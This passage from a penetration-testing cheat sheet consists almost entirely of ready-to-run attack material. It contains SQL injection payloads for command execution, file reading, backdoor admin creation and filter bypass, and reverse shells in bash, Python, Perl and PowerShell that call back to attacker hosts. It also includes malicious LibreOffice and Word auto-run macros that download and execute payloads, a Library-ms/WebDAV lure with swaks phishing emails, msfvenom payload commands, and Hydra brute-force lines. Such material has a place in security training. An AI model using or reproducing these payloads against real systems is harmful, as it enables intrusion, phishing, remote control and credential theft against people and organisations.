|                                      | `SELECT system('whoami');`                                                                      | Execute system commands                    |

- ### Oracle
| Category                        | SQL Code                                                                                                               | Description                                    |
|----------------------------------|------------------------------------------------------------------------------------------------------------------------|------------------------------------------------|
| **File operations via Java**    | `BEGIN`<br>`  DBMS_JAVA.endsession;`<br>`  EXECUTE IMMEDIATE 'create or replace and resolve java source named "FileReader" as`<br>`  import java.io.*;`<br>`  public class FileReader {`<br>`    public static String readFile(String filename) throws Exception {`<br>`      BufferedReader br = new BufferedReader(new FileReader(filename));`<br>`      String output = "";`<br>`      String line;`<br>`      while((line=br.readLine())!=null) { output += line + "\n"; }`<br>`      return output;`<br>`    }`<br>`  }';`<br>`END;`<br>`/` | Creates and runs Java source for file reading in Oracle DB   |
|                                  | `SELECT DBMS_JAVA.runjava('FileReader.readFile("/etc/passwd")') FROM dual;`                                            | Executes Java code to read `/etc/passwd` file  |
| **Network operations**          | `SELECT UTL_HTTP.REQUEST('http://10.10.10.10/') FROM dual;`                                                           | Makes an HTTP request                         |
|                                  | `SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM dual;`                                                      | DNS lookup                                    |
|                                  | `SELECT UTL_TCP.AVAILABLE('10.10.10.10', 4444) FROM dual;`                                                            | Port scan (check if port is available)        |
| **Command execution via Java**  | `BEGIN`<br>`  DBMS_JAVA.endsession;`<br>`  EXECUTE IMMEDIATE 'create or replace and resolve java source named "Shell" as`<br>`  public class Shell {`<br>`    public static String runCmd(String args) throws java.io.IOException {`<br>`      return new java.util.Scanner(Runtime.getRuntime().exec(args).getInputStream()).useDelimiter("\\A").next();`<br>`    }`<br>`  }';`<br>`END;`<br>`/` | Creates and runs Java code for command execution |
|                                  | `SELECT DBMS_JAVA.runjava('Shell.runCmd("whoami")') FROM dual;`                                                        | Executes system command (`whoami`)             |
| **Privilege escalation**        | `SELECT * FROM USER_ROLE_PRIVS;`                                                                                        | List current user privileges                  |
|                                  | `SELECT * FROM DBA_ROLE_PRIVS;`                                                                                         | List all role privileges                      |
|                                  | `SELECT * FROM ALL_TAB_PRIVS;`                                                                                          | List table privileges                         |

**Post-Exploitation**
| Category              | MySQL Code                                                                                       | MSSQL Code                                                                                     | Description                                         |
|-----------------------|--------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------|-----------------------------------------------------|
| **Enumerate Database Users** | `SELECT user,password FROM mysql.user;`                                                           | `SELECT name,password_hash FROM sys.sql_logins;`                                                  | Enumerates database users and their credentials.    |
| **Find Sensitive Data**    | `SELECT * FROM information_schema.tables WHERE table_name LIKE '%credit%';`                       | `SELECT * FROM information_schema.tables WHERE table_name LIKE '%credit%';`                      | Finds tables related to sensitive data (e.g., credit). |
|                       | `SELECT * FROM information_schema.columns WHERE column_name LIKE '%pass%';`                       | `SELECT * FROM information_schema.columns WHERE column_name LIKE '%pass%';`                      | Finds columns related to passwords.                 |
| **Reading Sensitive Files** | `' UNION SELECT LOAD_FILE('/etc/passwd')-- -`                                                      | `' UNION SELECT * FROM OPENROWSET(BULK 'C:/windows/win.ini', SINGLE_CLOB) AS x-- -`              | Reads sensitive files (e.g., `/etc/passwd` on MySQL and `win.ini` on MSSQL). |
| **Command Execution**      | `' UNION SELECT sys_exec('whoami')-- -`                                                            | `'; EXEC xp_cmdshell 'whoami'-- -`                                                               | Executes system commands (e.g., `whoami`).           |
| **Establishing Persistence** | `' UNION SELECT 'EXEC sp_addlogin ''backdoor'', ''password123''; EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin'';'-- -` | N/A                                                                                                | Creates a backdoor admin user with elevated privileges. |

**Bypass Techniques**
| Category                    | SQL Code                                                                                                                | Description                                             |
|-----------------------------|-------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------|
| **Quote Bypass**             | `SELECT * FROM users WHERE username=0x61646D696E`                                                                       | Hex encoding to bypass quote filters (`'admin` in hex)  |
|                             | `SELECT CONCAT('a','dmin')`                                                                                             | Concatenate to build strings without quotes             |
|                             | `SELECT CHAR(65,68,77,73,78)`                                                                                           | Builds 'ADMIN' using ASCII values                       |
| **Space Bypass**             | `SELECT/**/password/**/FROM/**/users/**/WHERE/**/id=1`                                                                   | Uses comments instead of spaces                         |
|                             | `SELECT(password)FROM(users)WHERE(id=1)`                                                                                | Eliminates need for spaces using parentheses            |
|                             | `SELECT%0Apassword%0AFROM%0Ausers`                                                                                       | Uses URL-encoded newlines                               |
| **Filter Bypass**            | `SeLeCt * fRoM uSeRs`                                                                                                   | Bypasses case-sensitive filters                         |
|                             | `SELECT -> [ALL, TOP 1]`                                                                                               | Alternative keyword for `SELECT`                        |
|                             | `UNION -> [UNION ALL]`                                                                                                  | Alternative for `UNION`                                 |
|                             | `SE%0ALECT`                                                                                                             | Uses keyword splitting                                  |
| **Multi-Layer Encoding Bypass** | `UNION SELECT -> %55%4E%49%4F%4E%20%53%45%4C%45%43%54`                                                                  | Single URL encoding                                      |
|                             | `UNION -> %2555%254E%2549%254F%254E`                                                                                     | Double URL encoding                                      |
|                             | `SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054`                                                                         | Unicode encoding                                         |
|                             | `UNION/*%0ASELECT*/`                                                                                                    | Combining comments and URL encoding                     |
| **Logic Alternative Bypass** | `WHERE id=1 -> WHERE id=2-1`                                                                                            | Mathematical operation to bypass WAF logic              |
|                             | `WHERE id=1 -> WHERE id=abs(1)`                                                                                         | Using `abs()` to bypass WAF                            |
|                             | `WHERE id=1 -> WHERE id BETWEEN 1 AND 1`                                                                                | Boolean operation for bypassing                        |
|                             | `WHERE name='admin' -> WHERE SUBSTR(name,1)='admin'`                                                                    | String operations for logic alternative                |
| **Unicode Normalization Bypass** | `SELECT -> ＳＥＬＥＣＴ`                                                                                               | Fullwidth character substitution                      |
|                             | `UNION -> ＵＮＩＯＮ`                                                                                                    | Unicode alternative characters                         |
|                             | `SEＬEＣＴ`                                                                                                              | Mixed Unicode and normal characters                    |
| **String Concatenation Bypass** | `'SEL'+'ECT' -> SELECT`                                                                                                 | Basic concatenation to avoid direct detection          |
|                             | `CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84))`                                                          | Using `CHAR` function to build `SELECT`                 |
|                             | `CONCAT(0x53,0x45,0x4C,0x45,0x43,0x54)`                                                                                | Hex concatenation to build `SELECT`                    |

## Login Bypass
| Description                                      | SQL Code                                     |
|--------------------------------------------------|----------------------------------------------|
| **Standard OR-based bypass**                    | `' OR 1=1 --+`                               |
| **Bypass with LIMIT (useful when multiple entries might be returned)** | `' OR 1=1 LIMIT 1 --+`                       |
| **Bypass by using string comparison (common trick when numeric bypass fails)** | `' OR 'a'='a --+`                            |
| **Using AND to combine conditions**             | `' OR 3=3 --+`                               |
| **More obfuscated example (avoiding use of typical 1=1)** | `' OR 2=2 --+`                               |
| **Bypass with string comparison (works for both MySQL and MSSQL)** | `' OR 'a'='a' --+`                           |
| **OR-based bypass with a numeric comparison**   | `' OR 3=3 --+`                               |
| **Bypass with LIMIT for MySQL (restricts to 1 entry)** | `' OR 1=1 LIMIT 1 --+`                       |
| **MSSQL version of limiting output with TOP**    | `' OR 1=1; SELECT TOP 1 * FROM users --+`    |

## Truncation

### Truncation-based SQL injection occurs when the database limits user input based on a specified length, discarding any characters beyond that limit. This can be exploited by an attacker to manipulate user data. For example, an attacker can create a new user with a name like 'admin' and their own password, potentially causing multiple entries for the same username. If both entries are evaluated as 'admin', the attacker could gain unauthorized access to the legitimate admin account.

### In the following example, the database truncates the username after a certain length (e.g., 10 characters). The attacker uses this to create a conflicting account:

- ### Example of truncation; the database discards extra characters
> ```text
> username=admin++++++++(max.length)&password=testpwn123
> 
> -- Assume the database has a 10-character limit on the username field, note that more characters are added because otherwise the truncation won't be made.
> username=admin++++++++&password=testpwn123
> 
> -- The database truncates the input to admin and discards the extra characters
> -- If a user admin already exists, the attacker might be able to bypass authentication.
> ```

---

## SWAKS

> sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
> --server [smtp-server-ip] --body [email-body.txt] \
> --header "Subject: [email-subject]" --suppress-data
>
>     Purpose: this is a basic email with an attachment sent through an SMTP server.
>
>     Key parameters:
>         -t: Recipient's email.
>         --from: Sender's email.
>         --attach: File to attach (e.g., a PDF or spreadsheet).
>         --server: SMTP server to send the email.
>         --body: Text file containing the email body.
>         --header: Adds custom headers like "Subject".
>         --suppress-data: Hides the email body in the output (for cleaner logs).
>
>
> sudo swaks -t <recipient@example.com> --from <sender@example.com> \
> --attach config.Library-ms --server <SMTP_SERVER> --body body.txt \
> --header "Subject: Problems" --suppress-data \
> --auth LOGIN --auth-user <username> --auth-password <password>
>
>     Purpose: sends an email with SMTP authentication using a username and password.
>
>     Additional Parameters:
>         --auth LOGIN: Specifies authentication type.
>         --auth-user: Username for the SMTP server.
>         --auth-password: Password for the SMTP server.
- ### Example
> ```bash
> sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.131.XXX --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"
> ```

--- 

## Macros

## LibreOffice

🎯 Step 1: Setup Netcat Listener

Start your reverse shell catcher first:
> ```bash
> nc -lvnp 4444
> ```
🎯 Step 2: Generate Linux Payloads
- Option A: Bash Reverse Shell (Simplest)
> ```bash
> echo 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' > shell.sh
> ```
- Option B: ELF Executable (msfvenom)
> ```bash
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf -o shell.elf
> ```
- Option C: Meterpreter Bash
> ```bash
> msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f bash -o payload.sh
> ```
- Option D: Python Reverse Shell
> ```bash
> cat > shell.py << 'EOF'
> import socket,subprocess,os
> s=socket.socket()
> s.connect(("<YOUR_IP>",4444))
> os.dup2(s.fileno(),0)
> os.dup2(s.fileno(),1)
> os.dup2(s.fileno(),2)
> subprocess.call(["/bin/sh","-i"])
> EOF
> ```
- Option E: Perl Reverse Shell
> ```bash
> cat > shell.pl << 'EOF'
> use Socket;$i="<YOUR_IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");
> EOF
> ```
🎯 Step 3: Host Payloads (Python Web Server)

Serve files from your attack machine:
> ```bash
> python3 -m http.server 80
> ```
URLs become:

    http://<YOUR_IP>/shell.sh
    http://<YOUR_IP>/shell.elf
    http://<YOUR_IP>/shell.py

🎯 Step 4: LibreOffice Macro Payload
- 1. Create Macro (LibreOffice Writer):
- 2. Open LibreOffice Writer → Alt + F11
- 3. Insert → Module → Name it Module1
- 4. Paste this macro:

> ```vb
> Sub RunShell
>     Shell("/bin/bash -c 'wget http://<YOUR_IP>/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh'")
> End Sub
> ```
- 5. Save as update.odt (enable macros)

- Macro Breakdown:

 wget → Downloads payload
 chmod +x → Makes executable  
 /tmp/shell.sh → Triggers reverse shell

🎯 Step 5: Deliver via Email (swaks)
> ```bash
> swaks --to target@example.com \
>       --from attacker@example.com \
>       --server smtp.example.com:587 \
>       --auth LOGIN \
>       --auth-user attacker@example.com \
>       --auth-password 'your_password' \
>       --attach update.odt \
>       --header "Subject: Urgent Document Update" \
>       --body "Please enable macros to view content."
> ```
🚀 Execution Flow

1. Victim opens update.odt
2. Enables macros (social engineering required)  
3. Macro downloads shell.sh
4. bash executes → reverse shell to YOUR nc listener
5. 🎉 Access granted!

## Microsoft Word

1. Create the Powershell Payload
- Payload
> ```powershell
> IEX(New-Object System.Net.WebClient).DownloadString("http://<LHOST>/powercat.ps1"); powercat -c <LHOST> -p <LPORT> -e powershell
>
>or
>
> powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
>
>or
>
> $client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ```

2. Ecode the payload
- Now Base64 encode it with UTF-16LE and LF (Unix)
- https://www.base64decode.org/
- https://gchq.github.io/CyberChef/
### Example: 
> ```text
> SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8APABMAEgATwBTAFQAPgAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAKQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAPABMAEgATwBTAFQAPgAgAC0AcAAgADwATABQAE8AUgBUAD4AIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsAA==
> ```

3. Using a python script to format
- Use the base64 encoded payload
> ```python
> str = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
>
> n = 50
>
> for i in range(0, len(str), n):
>     print("Str = Str + " + '"' + str[i:i+n] + '"') 
> ```
- Executing the script should look like:
> ```python
> python3 script.py 
> Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
> Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
> Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
> Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
> Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
> Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
> Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
> Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
> Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
> Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
> Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
> Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
> Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
> Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
> Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
> Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
> Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
> Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
> Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
> Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
> Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
> Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
> Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
> Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
> Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
> Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
> Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
> Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="
> ```

4. The Final Macro should appear as follows:
> ```vs
> Sub AutoOpen()
>    MyMacro
> End Sub
>
> Sub Document_Open()
>    MyMacro
> End Sub
> 
> Sub MyMacro()
>    Dim Str As String
>    
>    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
>    Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
>    Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
>    Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
>    Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
>    Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
>    Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
>    Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
>    Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
>    Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
>    Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
>    Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
>    Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
>    Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
>    Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
>    Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
>    Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
>    Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
>    Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
>    Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
>    Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
>    Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
>    Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
>    Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
>    Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
>    Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
>    Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
>    Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="
>
>    CreateObject("Wscript.Shell").Run Str
> End Sub
> ```

5. Installation of wsgidav
> ```bash
> pip install wsgidav
> wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
> ```

6. config.Library.ms
> ```vs
> <?xml version="1.0" encoding="UTF-8"?>
> <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
> <name>@windows.storage.dll,-34582</name>
> <version>6</version>
> <isLibraryPinned>true</isLibraryPinned>
> <iconReference>imageres.dll,-1003</iconReference>
> <templateInfo>
> <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
> </templateInfo>
> <searchConnectorDescriptionList>
> <searchConnectorDescription>
> <isDefaultSaveLocation>true</isDefaultSaveLocation>
> <isSupported>false</isSupported>
> <simpleLocation>
> <url>http://<LHOST></url>
> </simpleLocation>
> </searchConnectorDescription>
> </searchConnectorDescriptionList>
> </libraryDescription>
> ```

7. Put the config.Library-ms file in the webdav folder

8. Right-click on Windows to create a new shortcut file
> ```powershell
> powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
> ```

9. Put the shortcut file (*.lnk) into the webdav folder

10. Send Phishing Email
> ```bash
> swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
> ```

---

## Msfvenom

| **Platform**                   | **Command**                                                                                                           |
|---------------------------------|-----------------------------------------------------------------------------------------------------------------------|
| **Linux**                       | ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf```                              |
| **Windows**                     | ```msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe```                                |
| **Apache Tomcat (JSP)**         | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp```                               |
| **Apache Tomcat (WAR)**         | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war```                               |
| **ASP**                         | ```msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp```                               |
| **ASPX**                        | ```msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<443> -o shell64.aspx```                        |
| **Bash**                        | ```msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh```                                    |
| **JavaScript Shellcode**        | ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f js_le -o shellcode```                           |
| **JSP**                         | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp```                              |
| **Perl**                        | ```msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl```                                    |
| **PHP**              | `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php`                                           |
| **PHP Additional**   | `cat shell.php \| pbcopy \&\& echo '<?php ' \| tr -d '\n' > shell.php \&\& pbpaste >> shell.php`               |
| **Python**                      | ```msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py```                                  |
| **WAR**                         | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war```                              |
| **Linux Meterpreter (x86)**     | ```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf```                            |
| **Linux Meterpreter (Bind)**    | ```msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf```                              |
| **Linux Bind Shell (x64)**      | ```msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf```                                    |
| **Linux Reverse Shell (x64)**   | ```msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf```                                 |
| **Windows Meterpreter**         | ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe```                             |
| **Windows Meterpreter HTTP**    | ```msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe``` |
| **Windows Meterpreter Bind**    | ```msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe```                                |
| **Windows CMD Multi Stage**     | ```msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe```                                    |
| **Windows CMD Single Stage**    | ```msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe```                                   |
| **Windows Add User**            | ```msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe```                                     |
| **Mac Reverse Shell**           | ```msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho```                               |
| **Mac Bind Shell**              | ```msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho```                                 |
| **Python Shell**                | ```msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py```                                      |
| **Bash Shell**                  | ```msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh```                                        |
| **Perl Shell**                  | ```msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl```                                        |
| **ASP Meterpreter**             | ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp```                             |
| **JSP Shell**                   | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp```                                  |
| **WAR Shell**                   | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war```                                 |

---

## Brute Forcing

## Hydra

- ### SSH Brute Force
> ```bash
> hydra -l <username> -P <wordlist> -s <port> ssh://<target_ip>
> 
- ### FTP Brute Force
> ```bash
> hydra -l <username> -P <wordlist> ftp://<target_ip>
> ```
- ### SMB Brute Force
> ```bash
> hydra -L <user_list> -P <password_list> smb://<target_ip>
> ```
- ### Telnet Brute Force
> ```bash
> hydra -l <username> -P <wordlist> telnet://<target_ip>
> ```
- ### MySQL Brute Force
> ```bash
> hydra -l <username> -P <wordlist> mysql://<target_ip>
> ```
- ### PostgreSQL Brute Force
> ```bash
> hydra -l <username> -P <wordlist> postgres://<target_ip>
> ```
- ### VNC Brute Force
> ```bash
> hydra -P <password_list> vnc://<target_ip>
> ```
- ### HTTP Basic Authentication Brute Force
> ```bash
> hydra -l <username> -P <wordlist> <target_ip> http-get /
> ```
- ### SMTP Brute Force
> ```bash
> hydra -l <username> -P <wordlist> smtp://<target_ip>
> ```
- ### SNMP Brute Force
> ```bash
> hydra -P <wordlist> snmp://<target_ip>
> ```
- ### Redis Brute Force
